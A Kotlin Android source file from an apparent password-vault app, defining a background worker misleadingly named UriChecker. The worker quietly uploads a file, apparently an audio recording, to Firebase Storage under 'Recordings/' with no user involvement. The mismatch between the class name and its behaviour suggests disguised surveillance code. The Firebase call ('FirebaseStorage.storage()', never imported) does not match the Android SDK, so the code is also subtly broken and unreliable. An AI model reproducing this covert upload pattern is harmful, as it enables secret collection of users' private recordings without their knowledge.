package com.example.passwordvault.util

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.io.File
import java.io.FileInputStream

private val TAG = UriChecker::class.java.simpleName

class UriChecker(val context: Context, private val workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    override fun doWork(): Result {
        val latestRecord = workerParams.inputData.getString(LATEST_RECORD)
        val storageRef = FirebaseStorage.storage().reference
        try {
            val file = File(latestRecord!!)
            if (file.exists()) {
                val stream = FileInputStream(file)
                storageRef.child("Recordings/"+file.name).putStream(stream)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed -> $e")
        }
        Log.e(TAG, "Worker started, latest record: $latestRecord")
        return Result.success()
    }
//
//    private fun uploadFile() {
//        val exampleFile = File(applicationContext.filesDir, "ExampleKey")
//
//        exampleFile.writeText("Example file contents")
//
//        Amplify.Storage.uploadFile(
//            "ExampleKey",
//            exampleFile,
//            { result -> Log.i("MyAmplifyApp", "Successfully uploaded: " + result.getKey()) },
//            { error -> Log.e("MyAmplifyApp", "Upload failed", error) }
//        )
//    }

    override fun onStopped() {
        super.onStopped()
//        try {
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
//                WorkerProvider.periodicUriCheckWorkRequest(context)
//        } catch (e: NullPointerException) {
//            Log.e(TAG, "Worker Stopped with Exception -> $e")
//        }
        Log.e(TAG, "Worker Stopped")
    }
}